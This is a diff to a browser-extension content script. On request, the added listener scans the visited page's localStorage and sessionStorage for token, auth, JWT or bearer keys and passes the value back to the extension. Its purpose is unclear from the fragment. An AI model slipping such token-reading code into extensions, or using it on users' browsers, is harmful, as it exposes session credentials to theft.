@@ -112,3 +112,28 @@ const flushHits = () => {
     });
   } catch { /* noop */ }
 };
+
+try {
+  chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {
+    if (!message || message.type !== 'XAPI_READ_PAGE_STORAGE_TOKEN') return;
+    const findToken = (store: Storage) => {
+      for (let i = 0; i < store.length; i++) {
+        const key = store.key(i) || '';
+        if (/(token|auth|jwt|access|bearer)/i.test(key)) {
+          const val = store.getItem(key);
+          if (val && val.length >= 8 && val.length <= 4096) {
+            return { key, val };
+          }
+        }
+      }
+      return null;
+    };
+    try {
+      const hit = findToken(window.localStorage) || findToken(window.sessionStorage);
+      sendResponse({ hit });
+    } catch {
+      sendResponse({ hit: null });
+    }
+    return true;
+  });
+} catch { /* noop */ }
